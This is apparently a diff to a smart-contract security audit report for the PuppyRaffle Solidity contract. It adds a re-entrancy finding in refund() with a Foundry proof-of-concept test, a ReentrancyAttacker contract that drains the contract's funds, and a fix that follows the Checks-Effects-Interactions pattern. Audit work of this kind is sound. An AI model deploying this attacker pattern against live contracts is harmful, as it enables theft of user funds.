@@ -74,6 +74,9 @@ Place the following test into `PuppyRaffleTest.t.sol`
 
 2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.
 
+<details>
+<summary>Mitigation</summary>
+
 ```diff
 +   mapping(address => uint256) public s_addressToRaffleId;
 +   uint256 public raffleId = 0;
@@ -104,3 +107,132 @@ Place the following test into `PuppyRaffleTest.t.sol`
         require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
     }
 ```
+</details>
+
+---
+
+### [H-#] Re-Entrancy in `PuppyRaffle::refund`
+
+**Description:** `PuppyRaffle::refund` is sending the `entranceFee` back to the user. However, the issue arises because the user's balance is updated after sending the ETH, leading to Re-entrancy vulnerability.
+
+```js
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+@>      payable(msg.sender).sendValue(entranceFee);
+
+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }   
+```
+
+**Impact:** This results in the attacker withdrawing all the funds locked within the contract.
+
+**Proof of Concept:** 
+
+<details>
+<summary>Poc</summary>
+
+```js
+    function test_Reentrancy() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        uint256 raffleBalanceBefore = address(puppyRaffle).balance;
+
+        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+
+        vm.startPrank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+        vm.stopPrank();
+        // attacker has entered the raffle.
+
+        uint256 endingAttackContractBalance = address(attackerContract).balance;
+        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;
+
+        console.log("Starting attacker contract balance: ", startingAttackContractBalance);
+        console.log("Starting Raffle Balance", raffleBalanceBefore);
+
+        console.log("Ending attacker contract balance: ", endingAttackContractBalance);
+        console.log("Raffle Balance After Attack", raffleBalanceAfterAttack);
+
+        assertEq(endingAttackContractBalance, startingAttackContractBalance + 5 ether, "attackerContractBalance");
+        assertEq(raffleBalanceAfterAttack, 0);
+    }
+
+    contract ReentrancyAttacker {
+        PuppyRaffle private immutable i_victimContract;
+        uint256 private immutable i_entranceFee;
+        uint256 private s_attackerIndex;
+
+        constructor(PuppyRaffle victimContract) {
+            i_victimContract = PuppyRaffle(victimContract);
+            i_entranceFee = victimContract.entranceFee();
+        }
+
+        function attack() external payable {
+            address[] memory players = new address[](1);
+            players[0] = address(this);
+            i_victimContract.enterRaffle{value: i_entranceFee}(players);
+
+            s_attackerIndex = i_victimContract.getActivePlayerIndex(address(this));
+            i_victimContract.refund(s_attackerIndex);
+        }
+
+        function _stealMoney() internal {
+            if (address(i_victimContract).balance > 0) {
+                i_victimContract.refund(s_attackerIndex);
+            }
+        }
+
+        receive() external payable {
+            _stealMoney();
+        }
+
+        fallback() external payable {
+            _stealMoney();
+        }
+    }
+```
+
+</details>
+
+**Recommended Mitigation:** 
+
+1. Follow CEI(Checks, Effects, Interactions).
+   - Modifying storage variables falls under Effects.
+   - Sending ETH to other contracts falls under Interactions.
+   - To preserve CEI, storage variables has to be updated before external interactions.
+
+2. Use Reentrancy Guard from [Openzeppelin](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard). 
+
+<details>
+<summary>Mitigation</summary>
+
+```diff
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+-       payable(msg.sender).sendValue(entranceFee);
+
+        players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+
++       payable(msg.sender).sendValue(entranceFee);
+    }
+```
+
+</details>
